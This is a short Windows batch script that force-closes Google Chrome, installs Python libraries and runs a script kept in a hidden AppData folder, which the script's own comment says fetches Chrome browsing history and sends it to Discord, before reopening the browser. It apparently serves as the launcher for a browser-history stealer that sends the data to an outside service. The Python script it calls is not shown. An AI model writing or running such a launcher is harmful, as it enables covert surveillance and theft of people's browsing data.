@echo off

:: Step 1: Close Google Chrome if it's running
echo Closing Google Chrome...
taskkill /F /IM chrome.exe >nul 2>nul

:: Step 2: Wait for a moment to ensure Chrome has closed
timeout /t 2 /nobreak >nul

:: Step 3: Install required Python libraries if not already installed
echo Installing required Python libraries...
python -m pip install --upgrade requests psutil gpuinfo

:: Step 4: Run the Python script to fetch Chrome history and send it to Discord
echo Running the Python script...
python "%APPDATA%\history\history_report.py"

:: Step 5: Open Google Chrome again
echo Reopening Google Chrome...
start chrome

:: Step 6: Keep the command prompt open for debugging (optional)
pause
